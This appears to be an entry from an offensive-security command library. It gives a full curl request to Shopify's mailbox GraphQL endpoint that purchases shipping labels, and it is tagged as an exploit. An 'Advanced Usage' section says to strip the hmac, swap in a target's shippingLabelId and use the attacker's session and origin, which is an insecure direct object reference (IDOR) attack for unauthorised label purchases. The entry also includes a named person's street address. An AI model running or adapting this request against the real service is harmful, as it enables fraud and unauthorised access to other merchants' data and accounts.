---
id: cmd-884159-purchase-labels
data: >-
  curl 'https://mailbox.shopifycloud.com/graphql/labels?sessionId=4e8da4a36b' -H
  'authority: mailbox.shopifycloud.com' -H 'cache-control: max-age=0' -H
  'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4)
  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' -H
  'content-type: application/json' -H 'accept: */*' -H 'origin:
  https://fbeaudoinplus01.myshopify.com' -H 'sec-fetch-site: cross-site' -H
  'sec-fetch-mode: cors' -H 'sec-fetch-dest: empty' -H 'accept-language:
  en-US,en;q=0.9' --data-binary $'{"query":"mutation
  PurchaseShippingLabels($shippingLabelPurchaseRequests:[ShippingLabelPurchaseRequestInput!]!){purchaseShippingLabels(shippingLabelPurchaseRequests:$shippingLabelPurchaseRequests){shippingLabelId
  status notices{code severity message shippingLabelId carrierCode serviceCode
  serviceName
  __typename}__typename}}","variables":{"shippingLabelPurchaseRequests":[{"shippingLabelId":"gid://shopify/ShippingLabel/522221879427",
  "hmac": "5TjRpa34as7d34OPPEhneeu4723=",
  "shippingRateSelection":{"carrierCode":"canada_post","serviceCode":"DOM.EP","serviceName":"Expedited
  Parcel","quotedCost":{"amount":7.91,"currencyCode":"CAD"},"shipmentOptions":[]},"destinationAddress":{"name":"Francis
  Beaudoinn","address1":"25-838 Rue
  Grandjean","address2":"","city":"Québec","province":"QC","postalCode":"G1X
  3W5","country":"CA","phone":"","company":">"},"weight":0.00001,"weightUnit":"kg","selectedPackage":{"name":"Sample
  box","key":"gid://shopify/ShippingPackageV2/46497464451","type":"box","length":35,"width":26,"height":5,"dimensionUnit":"cm","weight":0,"weightUnit":"kg"},"lineItems":[{"lineItemId":"gid://shopify/LineItem/4975517728899","quantity":1}],"customsLineItems":[{"description":"test","quantity":1,"value":0,"weight":0,"weightUnit":"kg","countryOfOrigin":"","provinceOfOrigin":null,"hsCode":"","inventoryItemId":null}],"shippingDate":"2020-05-27","customerNotificationDate":"2020-05-27"}]},"operationName":"PurchaseShippingLabels"}'
  --compressed
tags:
  - graphql
  - shopify
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.568Z'
verified: false
validated: true
submitted: true
---
# purchase-shipping-labels-graphql

## Command

```bash
curl 'https://mailbox.shopifycloud.com/graphql/labels?sessionId=4e8da4a36b' -H 'authority: mailbox.shopifycloud.com' -H 'cache-control: max-age=0' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' -H 'origin: https://fbeaudoinplus01.myshopify.com' -H 'sec-fetch-site: cross-site' -H 'sec-fetch-mode: cors' -H 'sec-fetch-dest: empty' -H 'accept-language: en-US,en;q=0.9' --data-binary $'{"query":"mutation PurchaseShippingLabels($shippingLabelPurchaseRequests:[ShippingLabelPurchaseRequestInput!]!){purchaseShippingLabels(shippingLabelPurchaseRequests:$shippingLabelPurchaseRequests){shippingLabelId status notices{code severity message shippingLabelId carrierCode serviceCode serviceName __typename}__typename}}","variables":{"shippingLabelPurchaseRequests":[{"shippingLabelId":"gid://shopify/ShippingLabel/522221879427", "hmac": "5TjRpa34as7d34OPPEhneeu4723=", "shippingRateSelection":{"carrierCode":"canada_post","serviceCode":"DOM.EP","serviceName":"Expedited Parcel","quotedCost":{"amount":7.91,"currencyCode":"CAD"},"shipmentOptions":[]},"destinationAddress":{"name":"Francis Beaudoinn","address1":"25-838 Rue Grandjean","address2":"","city":"Québec","province":"QC","postalCode":"G1X 3W5","country":"CA","phone":"","company":">"},"weight":0.00001,"weightUnit":"kg","selectedPackage":{"name":"Sample box","key":"gid://shopify/ShippingPackageV2/46497464451","type":"box","length":35,"width":26,"height":5,"dimensionUnit":"cm","weight":0,"weightUnit":"kg"},"lineItems":[{"lineItemId":"gid://shopify/LineItem/4975517728899","quantity":1}],"customsLineItems":[{"description":"test","quantity":1,"value":0,"weight":0,"weightUnit":"kg","countryOfOrigin":"","provinceOfOrigin":null,"hsCode":"","inventoryItemId":null}],"shippingDate":"2020-05-27","customerNotificationDate":"2020-05-27"}]},"operationName":"PurchaseShippingLabels"}' --compressed
```

## Description

This curl command sends a GraphQL mutation to purchase a shipping label via Shopify's mailbox service. It is used to capture legitimate requests or exploit IDOR by modifying the shippingLabelId and sessionId.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sessionId` | Query parameter for authenticating the session (e.g., 4e8da4a36b) | Yes |
| `--data-binary` | JSON payload with PurchaseShippingLabels mutation, including shippingLabelId, hmac, address, weight, etc. | Yes |
| `-H origin` | Source shop domain (e.g., https://fbeaudoinplus01.myshopify.com) | Yes |
| `--compressed` | Enables gzip compression handling | No |

## Examples

### Basic Usage

```bash
curl 'https://mailbox.shopifycloud.com/graphql/labels?sessionId=4e8da4a36b' [headers and data as above]
```

### Advanced Usage (Modified for IDOR)

Remove hmac, swap shippingLabelId to target's, update sessionId and origin to attacker's.

```bash
curl 'https://mailbox.shopifycloud.com/graphql/labels?sessionId=attacker_session' [modified payload]
```

## Expected Output

JSON response with {"data":{"purchaseShippingLabels":[{"shippingLabelId":"gid://...","status":"success","notices":[]}]}} indicating successful label purchase.

## Related

- [[commands/authenticate-mailbox-session]]
- [[procedures/Exploit-IDOR-to-Generate-Unauthorized-Shipping-Label]]
